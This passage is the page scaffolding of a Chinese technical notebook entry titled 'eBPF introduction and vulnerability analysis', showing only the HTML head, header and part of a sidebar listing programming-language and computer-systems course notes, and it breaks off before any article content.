<!DOCTYPE html>
<html class="no-js" lang="zh">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<meta content="鹤翔万里（TonyCrane）的笔记本" name="description"/>
<link href="https://note.tonycrane.cc/sec/syssec/project/" rel="canonical"/>
<link href="../lab3/" rel="prev"/>
<link href="../../iotsec/" rel="next"/>
<link href="../../../feed_rss_created.xml" rel="alternate" title="RSS 订阅" type="application/rss+xml"/>
<link href="../../../feed_rss_updated.xml" rel="alternate" title="已更新内容的 RSS 订阅" type="application/rss+xml"/>
<link href="../../../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.6.1, mkdocs-material-9.6.23" name="generator"/>
<title>eBPF 简介与漏洞分析 - 鹤翔万里的笔记本</title>
<link href="../../../assets/stylesheets/main.84d31ad4.min.css" rel="stylesheet"/>
<link href="../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
<link href="../../../css/counter.css" rel="stylesheet"/>
<link href="../../../css/heti.css" rel="stylesheet"/>
<link href="../../../css/timeline.css" rel="stylesheet"/>
<link href="https://cdn.tonycrane.cc/utils/katex.min.css" rel="stylesheet"/>
<link href="https://cdn.tonycrane.cc/jbmono/jetbrainsmono.css" rel="stylesheet"/>
<link href="https://cdn.tonycrane.cc/lxgw/lxgwscreen.css" rel="stylesheet"/>
<link href="../../../css/tasklist.css" rel="stylesheet"/>
<link href="../../../css/custom.css" rel="stylesheet"/>
<link href="../../../css/card.css" rel="stylesheet"/>
<link href="../../../css/flink.css" rel="stylesheet"/>
<link href="../../../css/changelog_extra.css" rel="stylesheet"/>
<link href="../../../css/toc_extra.css" rel="stylesheet"/>
<link href="../../../css/svg_extra.css" rel="stylesheet"/>
<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?c273de7f67d992cb6aef08c3ddf09bb2";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DYETCPM289"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-DYETCPM289",{page_path:e.pathname})})})</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-DYETCPM289"></script>
<script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
<link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
<body data-md-color-accent="indigo" data-md-color-primary="indigo" data-md-color-scheme="default" dir="ltr">
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#ebpf">
          跳转至
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header" data-md-component="header">
<nav aria-label="页眉" class="md-header__inner md-grid">
<a aria-label="鹤翔万里的笔记本" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="鹤翔万里的笔记本">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            鹤翔万里的笔记本
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              eBPF 简介与漏洞分析
            
          </span>
</div>
</div>
</div>
<div class="md-header__options">
<div class="md-header-nav__scheme md-header-nav__button md-source__icon md-icon">
<a class="light-mode" href="javascript:toggleScheme();" title="Light mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"></path></svg>
</a>
<a class="dark-mode" href="javascript:toggleScheme();" title="Dark mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"></path></svg>
</a>
<a class="system-mode" href="javascript:toggleScheme();" title="System preference">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7.5 2c-1.79 1.15-3 3.18-3 5.5s1.21 4.35 3.03 5.5C4.46 13 2 10.54 2 7.5A5.5 5.5 0 0 1 7.5 2m11.57 1.5 1.43 1.43L4.93 20.5 3.5 19.07zm-6.18 2.43L11.41 5 9.97 6l.42-1.7L9 3.24l1.75-.12.58-1.65L12 3.1l1.73.03-1.35 1.13zm-3.3 3.61-1.16-.73-1.12.78.34-1.32-1.09-.83 1.36-.09.45-1.29.51 1.27 1.36.03-1.05.87zM19 13.5a5.5 5.5 0 0 1-5.5 5.5c-1.22 0-2.35-.4-3.26-1.07l7.69-7.69c.67.91 1.07 2.04 1.07 3.26m-4.4 6.58 2.77-1.15-.24 3.35zm4.33-2.7 1.15-2.77 2.2 2.54zm1.15-4.96-1.14-2.78 3.34.24zM9.63 18.93l2.77 1.15-2.53 2.19z"></path></svg>
</a>
<a class="unknown-mode" href="javascript:toggleScheme();" title="Unknown scheme">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m15.07 11.25-.9.92C13.45 12.89 13 13.5 13 15h-2v-.5c0-1.11.45-2.11 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41a2 2 0 0 0-2-2 2 2 0 0 0-2 2H8a4 4 0 0 1 4-4 4 4 0 0 1 4 4 3.2 3.2 0 0 1-.93 2.25M13 19h-2v-2h2M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10c0-5.53-4.5-10-10-10"></path></svg>
</a>
</div>
</div>
<script src="../../../js/scheme.js" type="text/javascript"></script>
<label class="md-header__button md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
</label>
<div class="md-search" data-md-component="search" role="dialog">
<label class="md-search__overlay" for="__search"></label>
<div class="md-search__inner" role="search">
<form class="md-search__form" name="search">
<input aria-label="搜索" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="搜索" required="" spellcheck="false" type="text"/>
<label class="md-search__icon md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
</label>
<nav aria-label="查找" class="md-search__options">
<button aria-label="清空当前内容" class="md-search__icon md-icon" tabindex="-1" title="清空当前内容" type="reset">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
</button>
</nav>
</form>
<div class="md-search__output">
<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
<div class="md-search-result" data-md-component="search-result">
<div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
<ol class="md-search-result__list" role="presentation"></ol>
</div>
</div>
</div>
</div>
</div>
<div class="md-header__source">
<a class="md-source" data-md-component="source" href="https://github.com/TonyCrane/note/" title="前往仓库">
<div class="md-source__icon md-icon">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
</div>
<div class="md-source__repository">
    TonyCrane/note
  </div>
</a>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<nav aria-label="标签" class="md-tabs" data-md-component="tabs">
<div class="md-grid">
<ul class="md-tabs__list">
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../..">
          
  
  
    
  
  Home

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../../cs/">
          
  
  
    
  
  Computer Science

        </a>
</li>
<li class="md-tabs__item md-tabs__item--active">
<a class="md-tabs__link" href="../../">
          
  
  
    
  
  Security

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../../devops/">
          
  
  
    
  
  DevOps

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../../ctf/">
          
  
  
    
  
  CTF

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../../writeups/">
          
  
  
    
  
  Writeups

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../../others/">
          
  
  
    
  
  Others

        </a>
</li>
</ul>
</div>
</nav>
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="导航栏" class="md-nav md-nav--primary md-nav--lifted" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="鹤翔万里的笔记本" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="鹤翔万里的笔记本">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"></path></svg>
</a>
    鹤翔万里的笔记本
  </label>
<div class="md-nav__source">
<a class="md-source" data-md-component="source" href="https://github.com/TonyCrane/note/" title="前往仓库">
<div class="md-source__icon md-icon">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
</div>
<div class="md-source__repository">
    TonyCrane/note
  </div>
</a>
</div>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../..">
<span class="md-ellipsis">
    Home
    
  </span>
</a>
<label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_1_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_1">
<span class="md-nav__icon md-icon"></span>
            Home
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../changelog/">
<span class="md-ellipsis">
    更新记录
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../links/">
<span class="md-ellipsis">
    友链
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/">
<span class="md-ellipsis">
    Computer Science
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
            Computer Science
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/">
<span class="md-ellipsis">
    编程语言 &amp; ISA
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_2">
<span class="md-nav__icon md-icon"></span>
            编程语言 &amp; ISA
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
<span class="md-ellipsis">
    C/C++
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_2_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_2">
<span class="md-nav__icon md-icon"></span>
            C/C++
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/c_cpp/c/">
<span class="md-ellipsis">
    C 语言杂项
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/c_cpp/oop/">
<span class="md-ellipsis">
    C++ 面向对象
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/python/">
<span class="md-ellipsis">
    Python
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_3_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_3">
<span class="md-nav__icon md-icon"></span>
            Python
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/python/basic/">
<span class="md-ellipsis">
    Python 基础语法
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/python/numpy/">
<span class="md-ellipsis">
    NumPy
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/python/pil/">
<span class="md-ellipsis">
    PIL
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/rust/">
<span class="md-ellipsis">
    Rust
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2_4" id="__nav_2_2_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_4_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_4">
<span class="md-nav__icon md-icon"></span>
            Rust
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/rust/basic/">
<span class="md-ellipsis">
    Rust 基础语法
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/rust/misc/">
<span class="md-ellipsis">
    Rust 杂项随记
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/haskell/">
<span class="md-ellipsis">
    Haskell
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/chisel/">
<span class="md-ellipsis">
    Chisel
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/asm/">
<span class="md-ellipsis">
    x86 汇编语言
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_8" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/riscv/">
<span class="md-ellipsis">
    RISC-V ISA
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2_8" id="__nav_2_2_8_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_8_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_8">
<span class="md-nav__icon md-icon"></span>
            RISC-V ISA
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/riscv/unprivileged/">
<span class="md-ellipsis">
    RISC-V 非特权级 ISA
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/riscv/privileged/">
<span class="md-ellipsis">
    RISC-V 特权级 ISA
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/riscv/paging/">
<span class="md-ellipsis">
    RISC-V 页表相关
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/riscv/spike/">
<span class="md-ellipsis">
    Spike 工具链相关
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_9" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/ppl/">
<span class="md-ellipsis">
    编程语言原理
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2_9" id="__nav_2_2_9_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_9_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_9">
<span class="md-nav__icon md-icon"></span>
            编程语言原理
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic1/">
<span class="md-ellipsis">
    Lambda 演算
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic2/">
<span class="md-ellipsis">
    抽象语法树与归纳法
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic3/">
<span class="md-ellipsis">
    静态语义与动态语义
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic4/">
<span class="md-ellipsis">
    函数与递归
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic5/">
<span class="md-ellipsis">
    数据类型
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/ppl/topic6/">
<span class="md-ellipsis">
    递归系统 PCF
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_2_10" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/pl/compiler/">
<span class="md-ellipsis">
    编译原理
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_2_10" id="__nav_2_2_10_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_2_10_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_2_10">
<span class="md-nav__icon md-icon"></span>
            编译原理
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/pl/compiler/topic1/">
<span class="md-ellipsis">
    词法分析与语法分析
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/system/">
<span class="md-ellipsis">
    计算机系统
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_3">
<span class="md-nav__icon md-icon"></span>
            计算机系统
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/system/cs1/">
<span class="md-ellipsis">
    计算机系统 I
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_2_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_3_2">
<span class="md-nav__icon md-icon"></span>
            计算机系统 I
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic1/">
<span class="md-ellipsis">
    数据的表示
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic2/">
<span class="md-ellipsis">
    数字逻辑电路基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic3/">
<span class="md-ellipsis">
    组合逻辑电路设计
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic4/">
<span class="md-ellipsis">
    时序逻辑电路设计
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic5/">
<span class="md-ellipsis">
    指令集体系结构
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/topic6/">
<span class="md-ellipsis">
    处理器
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_2_8" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_3_2_8" id="__nav_2_3_2_8_label" tabindex="0">
<span class="md-ellipsis">
    系统 I 实验部分
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_2_8_label" class="md-nav" data-md-level="4">
<label class="md-nav__title" for="__nav_2_3_2_8">
<span class="md-nav__icon md-icon"></span>
            系统 I 实验部分
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab1-1/">
<span class="md-ellipsis">
    系统 I lab1-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab1-2/">
<span class="md-ellipsis">
    系统 I lab1-2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab2-1/">
<span class="md-ellipsis">
    系统 I lab2-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab2-2/">
<span class="md-ellipsis">
    系统 I lab2-2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab3/">
<span class="md-ellipsis">
    系统 I lab3
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab4-1/">
<span class="md-ellipsis">
    系统 I lab4-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab4-2/">
<span class="md-ellipsis">
    系统 I lab4-2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab5-1/">
<span class="md-ellipsis">
    系统 I lab5-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs1/lab5-2/">
<span class="md-ellipsis">
    系统 I lab5-2
    
  </span>
